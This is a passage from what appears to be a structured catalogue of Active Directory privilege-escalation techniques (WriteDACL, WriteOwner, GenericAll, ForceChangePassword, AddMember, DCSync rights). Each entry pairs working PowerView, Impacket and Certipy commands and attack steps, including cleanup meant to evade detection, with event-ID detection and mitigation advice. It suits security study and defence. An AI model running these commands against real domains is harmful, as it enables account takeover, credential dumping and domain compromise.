        command: "Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync -Verbose",
        description: "Grants DCSync rights to the attacker on the domain object"
      },
      {
        name: "PowerView (grant GenericAll)",
        command: "Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All -Verbose",
        description: "Grants GenericAll on a user object allowing full control"
      },
      {
        name: "Impacket dacledit",
        command: "python3 dacledit.py -action write -rights DCSync -principal attacker -target-dn 'DC=domain,DC=local' domain.local/writedacl_user:password -dc-ip 10.0.0.1",
        description: "Modifies the DACL from Linux to grant DCSync rights"
      },
      {
        name: "BloodHound (find WriteDACL)",
        command: "MATCH p=(u:User)-[:WriteDacl]->(d:Domain) RETURN p",
        description: "BloodHound query to find users with WriteDACL on the domain object"
      }
    ],
    steps: [
      "Step 1: Identify objects where you have WriteDACL. Use BloodHound to find WriteDacl edges, or PowerView: Get-DomainObjectAcl -Identity 'DC=domain,DC=local' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'WriteDacl'}.",
      "Step 2: Determine the escalation path. WriteDACL on the domain object allows DCSync. WriteDACL on a user/group allows full control of that object.",
      "Step 3: For DCSync escalation: Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync. This grants DS-Replication-Get-Changes and DS-Replication-Get-Changes-All.",
      "Step 4: Perform DCSync: mimikatz lsadump::dcsync /domain:domain.local /user:krbtgt or secretsdump.py domain.local/attacker@dc01.",
      "Step 5: For user control: Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All, then reset the user's password or modify their attributes.",
      "Step 6: Clean up by removing the added ACEs after exploitation to reduce detection footprint."
    ],
    detection: "Monitor for DACL modifications on sensitive objects via Event ID 5136 (Directory Service Changes) and Event ID 4662 (Operation performed on an object). Alert on new ACEs being added to the domain root, AdminSDHolder, or privileged account objects. Track replication rights grants (DS-Replication-Get-Changes extended rights). BloodHound analysis can identify new privilege paths created by DACL modifications. Implement baseline comparisons of critical object ACLs.",
    mitigation: "Audit and restrict WriteDACL permissions on sensitive objects. Only Domain Admins should have WriteDACL on the domain object, AdminSDHolder, and privileged accounts. Use BloodHound to identify and remediate dangerous ACL paths. Implement ACL monitoring with baseline comparisons. Deploy Microsoft Defender for Identity for real-time ACL change detection.",
    references: [
      "https://attack.mitre.org/techniques/T1222/001/",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync",
      "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse"
    ]
  },
  {
    id: "AD-047",
    name: "WriteOwner Abuse",
    category: "privilege_escalation",
    description: "WriteOwner abuse exploits the ability to change the owner of an Active Directory object. The owner of an AD object has implicit WriteDACL permissions, meaning they can modify the object's access control list. If an attacker has WriteOwner rights on an object, they can change the owner to themselves, then use the implicit WriteDACL to grant themselves full control (GenericAll) or other specific rights. This is a two-step escalation: WriteOwner leads to WriteDACL, which leads to any permission. WriteOwner on the domain object leads to DCSync capability. WriteOwner on a group leads to the ability to add members. WriteOwner on a user leads to password reset or credential modification capability.",
    prerequisites: [
      "WriteOwner permission on the target AD object"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "PowerView (change owner)",
        command: "Set-DomainObjectOwner -Identity targetobject -OwnerIdentity attacker -Verbose",
        description: "Changes the owner of the target object to the attacker"
      },
      {
        name: "PowerView (grant rights)",
        command: "Add-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity attacker -Rights All -Verbose",
        description: "Grants GenericAll rights using the owner's implicit WriteDACL"
      },
      {
        name: "Impacket owneredit",
        command: "python3 owneredit.py -action write -new-owner attacker -target targetobject domain.local/writeowner_user:password -dc-ip 10.0.0.1",
        description: "Changes the owner of an AD object from Linux"
      }
    ],
    steps: [
      "Step 1: Identify objects where you have WriteOwner. Use BloodHound to find WriteOwner edges or PowerView for manual enumeration.",
      "Step 2: Change the owner of the target object to yourself: Set-DomainObjectOwner -Identity targetobject -OwnerIdentity attacker.",
      "Step 3: As the new owner, use your implicit WriteDACL to grant yourself full control: Add-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity attacker -Rights All.",
      "Step 4: Exercise the granted permissions: reset passwords, modify group memberships, or grant DCSync rights depending on the object type.",
      "Step 5: Optionally restore the original owner and remove your ACEs to minimize detection.",
      "Step 6: Use the gained access for further escalation or lateral movement."
    ],
    detection: "Monitor for owner changes on AD objects via Event ID 5136 targeting the nTSecurityDescriptor attribute. Alert on ownership changes for critical objects (domain root, AdminSDHolder, privileged groups). Track subsequent DACL modifications after ownership changes. BloodHound can detect new WriteOwner edges during re-collection.",
    mitigation: "Audit WriteOwner permissions on critical AD objects and remove unnecessary grants. Monitor ownership changes on sensitive objects. Implement change management for AD ACL modifications. Restrict who can take ownership of AD objects. Deploy monitoring for cascading permission changes (ownership change followed by DACL modification).",
    references: [
      "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse",
      "https://www.thehacker.recipes/ad/movement/dacl/writeowner"
    ]
  },
  {
    id: "AD-048",
    name: "GenericAll / GenericWrite Abuse",
    category: "privilege_escalation",
    description: "GenericAll provides full control over an AD object, equivalent to having all individual rights combined. GenericWrite provides the ability to write to any non-protected attribute on the object. Both permissions enable multiple attack paths depending on the object type. On a user object: GenericAll allows password reset (ForceChangePassword), Kerberoasting setup (adding an SPN), shadow credentials (modifying msDS-KeyCredentialLink), and targeted AS-REP Roasting (enabling DONT_REQUIRE_PREAUTH). On a group object: both allow adding members to the group (Self or WriteProperty on the member attribute). On a computer object: both allow modifying msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD attack, reading LAPS passwords, or adding shadow credentials. GenericAll and GenericWrite are among the most commonly abused ACL configurations found during AD assessments, as they are often granted to service accounts, helpdesk groups, or through inheritance from parent containers.",
    prerequisites: [
      "GenericAll or GenericWrite permission on the target AD object"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "PowerView (reset password)",
        command: "Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force) -Verbose",
        description: "Resets the target user's password using GenericAll rights"
      },
      {
        name: "PowerView (add to group)",
        command: "Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker -Verbose",
        description: "Adds the attacker to Domain Admins using GenericAll on the group"
      },
      {
        name: "PowerView (add SPN)",
        command: "Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='MSSQLSvc/fake.domain.local:1433'} -Verbose",
        description: "Adds an SPN to a user for targeted Kerberoasting"
      },
      {
        name: "Certipy (shadow creds)",
        command: "certipy shadow auto -u attacker@domain.local -p password -account targetuser -dc-ip 10.0.0.1",
        description: "Adds shadow credentials to the target using GenericWrite"
      },
      {
        name: "PowerView (disable preauth)",
        command: "Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304} -Verbose",
        description: "Disables Kerberos pre-authentication for targeted AS-REP Roasting"
      },
      {
        name: "Impacket (RBCD on computer)",
        command: "python3 rbcd.py domain.local/attacker:password -delegate-to 'TARGET$' -delegate-from 'CONTROLLED$' -action write -dc-ip 10.0.0.1",
        description: "Configures RBCD on a computer object using GenericWrite"
      }
    ],
    steps: [
      "Step 1: Identify objects where you have GenericAll or GenericWrite using BloodHound or PowerView. BloodHound visualizes these as GenericAll and GenericWrite edges.",
      "Step 2: Determine the object type and choose the appropriate abuse technique.",
      "Step 3: For user objects - Option A: Reset the password with Set-DomainUserPassword. Option B: Add an SPN and Kerberoast. Option C: Add shadow credentials. Option D: Disable pre-auth for AS-REP Roasting.",
      "Step 4: For group objects: Add yourself or a controlled account as a member: Add-DomainGroupMember -Identity 'Target Group' -Members attacker.",
      "Step 5: For computer objects: Configure RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) or add shadow credentials.",
      "Step 6: For the domain object: Grant yourself DCSync rights via WriteDACL.",
      "Step 7: Execute the follow-up attack (authenticate with new password, crack Kerberoast hash, perform S4U via RBCD, etc.).",
      "Step 8: Clean up: remove SPNs, shadow credentials, group memberships, or RBCD configurations after exploitation."
    ],
    detection: "Monitor for attribute modifications on sensitive objects via Event ID 5136. Track password resets (Event ID 4724), SPN changes, group membership modifications (Event ID 4728, 4732, 4756), and msDS-AllowedToActOnBehalfOfOtherIdentity changes. Alert on userAccountControl modifications (DONT_REQUIRE_PREAUTH toggle). Monitor msDS-KeyCredentialLink changes for shadow credential attacks. BloodHound periodic re-collection can detect new access granted through these attacks.",
    mitigation: "Audit GenericAll and GenericWrite permissions across the domain using BloodHound or manual DACL analysis. Remove unnecessary broad permissions. Implement the principle of least privilege for AD delegation. Use specific delegated permissions instead of GenericAll/GenericWrite where possible. Monitor for unauthorized attribute modifications on sensitive objects.",
    references: [
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces",
      "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse"
    ]
  },
  {
    id: "AD-049",
    name: "ForceChangePassword Abuse",
    category: "privilege_escalation",
    description: "ForceChangePassword (also known as User-Force-Change-Password or ResetPassword extended right) allows an attacker to reset another user's password without knowing the current password. This permission is commonly granted to helpdesk groups, IT support staff, and service accounts for user password management. If an attacker compromises an account with ForceChangePassword rights on a privileged user (Domain Admin, service account, etc.), they can reset that user's password and authenticate as them. The reset generates Event ID 4724 (password reset) and Event ID 4738 (user account changed) which can be monitored for detection. The attack is noisy because it changes the target's actual password, which may trigger the user to report account issues. A more stealthy approach is to use shadow credentials or targeted Kerberoasting if GenericWrite is available instead.",
    prerequisites: [
      "ForceChangePassword (User-Force-Change-Password) extended right on the target user object",
      "Network access to a domain controller"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "PowerView",
        command: "Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force) -Verbose",
        description: "Resets the target user's password"
      },
      {
        name: "net user",
        command: "net user targetuser NewP@ssw0rd! /domain",
        description: "Resets a domain user's password using built-in Windows commands"
      },
      {
        name: "rpcclient",
        command: "rpcclient -U 'domain.local/attacker%password' dc01.domain.local -c 'setuserinfo2 targetuser 23 NewP@ssw0rd!'",
        description: "Resets a user's password from Linux via RPC"
      }
    ],
    steps: [
      "Step 1: Identify accounts where you have ForceChangePassword rights. Use BloodHound to find ForceChangePassword edges or PowerView to enumerate ACLs.",
      "Step 2: Assess the impact: check the target user's group memberships and privileges to determine the value of the password reset.",
      "Step 3: Reset the password: Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force).",
      "Step 4: Authenticate as the target user using the new password for lateral movement or privilege escalation.",
      "Step 5: Be aware that the password reset may be detected by the target user (who can no longer log in with their old password) or by monitoring systems.",
      "Step 6: Consider changing the password back to the original (if known) or using the access quickly before detection."
    ],
    detection: "Monitor Event ID 4724 (An attempt was made to reset an account's password) and correlate with Event ID 4738 (A user account was changed). Alert when the password resetter is not a known authorized administrator or helpdesk agent. Track ForceChangePassword rights and alert when used on privileged accounts. Monitor for logon events (Event ID 4624) from the target account shortly after the reset.",
    mitigation: "Audit ForceChangePassword rights and restrict them to authorized helpdesk/support accounts only. Do not grant password reset rights on privileged accounts (Domain Admins, Enterprise Admins). Use the Protected Users group for privileged accounts. Implement monitoring for password resets on sensitive accounts. Use Just-In-Time (JIT) administration for temporary elevated access instead of persistent password reset rights.",
    references: [
      "https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",
      "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse"
    ]
  },
  {
    id: "AD-050",
    name: "AddMember Abuse",
    category: "privilege_escalation",
    description: "AddMember abuse exploits the Self (Self-Membership) or WriteProperty on the member attribute of a group to add arbitrary members. If an attacker has Self rights on a group, they can add their own account. If they have WriteProperty on the member attribute (or GenericAll/GenericWrite on the group), they can add any account. This is a direct path to privilege escalation when the target group has elevated permissions: adding an account to Domain Admins, Enterprise Admins, or other privileged groups immediately grants those privileges upon the next logon. The attack is straightforward but noisy, as group membership changes generate multiple security events.",
    prerequisites: [
      "Self, WriteProperty (on member attribute), GenericAll, or GenericWrite on the target group",
      "Network access to a domain controller"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "PowerView",
        command: "Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker -Verbose",
        description: "Adds the attacker to the Domain Admins group"
      },
      {
        name: "net group",
        command: "net group \"Domain Admins\" attacker /add /domain",
        description: "Adds a user to Domain Admins using built-in Windows commands"
      },
      {
        name: "Impacket",
        command: "python3 net.py domain.local/attacker:password -dc-ip 10.0.0.1 group add_member 'Domain Admins' attacker",
        description: "Adds a group member from Linux using Impacket"
      }
    ],
    steps: [
      "Step 1: Identify groups where you have AddMember capabilities. Use BloodHound to find AddMember, GenericAll, GenericWrite, or Self edges to group objects.",
      "Step 2: Assess the target group's privileges: what access does membership grant?",
      "Step 3: Add your account (or a controlled account) to the group: Add-DomainGroupMember -Identity 'Target Group' -Members attacker.",
      "Step 4: Log off and log back in (or use runas /netonly) to get a new token reflecting the group membership.",
      "Step 5: Use the elevated privileges for further attacks.",
      "Step 6: Optionally remove yourself from the group after achieving your objective to reduce detection."
    ],
    detection: "Monitor Event ID 4728 (Member added to security-enabled global group), 4732 (Member added to security-enabled local group), and 4756 (Member added to security-enabled universal group). Alert on additions to privileged groups (Domain Admins, Enterprise Admins, Schema Admins, Administrators, Account Operators, Server Operators, Backup Operators). Track the user who performed the addition and verify against authorized administrative actions.",
    mitigation: "Restrict group modification rights to authorized administrators only. Implement privileged group monitoring with immediate alerts. Use Just-In-Time group membership instead of persistent elevated access. Audit group ACLs regularly. Deploy Microsoft Defender for Identity for privileged group change detection.",
    references: [
      "https://www.thehacker.recipes/ad/movement/dacl/addmember",
      "https://attack.mitre.org/techniques/T1098/"
    ]
  },
  {
    id: "AD-051",
    name: "DCSync Rights Abuse (DS-Replication-Get-Changes)",
    category: "privilege_escalation",
    description: "This attack specifically targets the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights on the domain object. These rights control who can request AD replication, which includes password data. An attacker who can grant these rights to a controlled account (via WriteDACL on the domain object, GenericAll, or compromise of an account that already has them) can perform DCSync. The attack differs from the DCSync technique itself (AD-017) in that it focuses on the ACL manipulation needed to obtain DCSync rights rather than the replication process. Accounts that naturally have these rights include: Domain Admins, Enterprise Admins, SYSTEM on DCs, and the DC machine accounts. Additional accounts may have been granted these rights for legitimate purposes (Azure AD Connect, third-party AD tools, etc.).",
    prerequisites: [
      "WriteDACL on the domain root object, or knowledge of an account with existing DCSync rights",
      "Network access to a domain controller"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "PowerView (enumerate)",
        command: "Get-DomainObjectAcl -SearchBase 'DC=domain,DC=local' -SearchScope Base -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'DS-Replication-Get-Changes'} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' (Convert-SidToName $_.SecurityIdentifier); $_} | Select-Object IdentityName, ObjectAceType",
        description: "Lists all accounts with DCSync rights on the domain"
      },
      {
        name: "PowerView (grant rights)",
        command: "Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync -Verbose",
        description: "Grants DCSync rights to the attacker"
      },
      {
        name: "Impacket dacledit",
        command: "python3 dacledit.py -action write -rights DCSync -principal attacker -target-dn 'DC=domain,DC=local' domain.local/user:password -dc-ip 10.0.0.1",
        description: "Grants DCSync rights from Linux"
      },
      {
        name: "PowerView (remove rights)",
        command: "Remove-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync -Verbose",
        description: "Removes DCSync rights after exploitation for cleanup"
      }
    ],
    steps: [
      "Step 1: Enumerate existing DCSync rights holders to identify legitimate and potentially compromisable accounts.",
      "Step 2: If you have WriteDACL on the domain, grant DCSync rights: Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync.",
      "Step 3: Verify the rights were granted: Get-DomainObjectAcl -SearchBase 'DC=domain,DC=local' -SearchScope Base -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -match 'ATTACKER_SID'}.",
      "Step 4: Perform DCSync: secretsdump.py domain.local/attacker@dc01 or Mimikatz lsadump::dcsync.",
      "Step 5: Extract the krbtgt hash for Golden Ticket creation and all user hashes for comprehensive access.",
      "Step 6: Remove the DCSync rights to minimize detection: Remove-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync."
    ],
    detection: "Monitor for ACL changes on the domain root object (Event ID 5136). Specifically alert on new DS-Replication-Get-Changes and DS-Replication-Get-Changes-All grants. Maintain a baseline of accounts with DCSync rights and alert on deviations. Monitor for DCSync activity (Event ID 4662 with replication extended rights) from non-DC accounts. Microsoft Defender for Identity detects both DCSync rights grants and DCSync execution.",
    mitigation: "Minimize accounts with DCSync rights to only those absolutely necessary (DCs, Azure AD Connect). Audit DCSync rights regularly. Monitor for new grants. Implement change management for replication rights. Deploy advanced threat detection for replication abuse.",
    references: [
      "https://attack.mitre.org/techniques/T1003/006/",
      "https://adsecurity.org/?p=1729",
      "https://www.thehacker.recipes/ad/movement/dacl/grant-rights"
    ]
  },
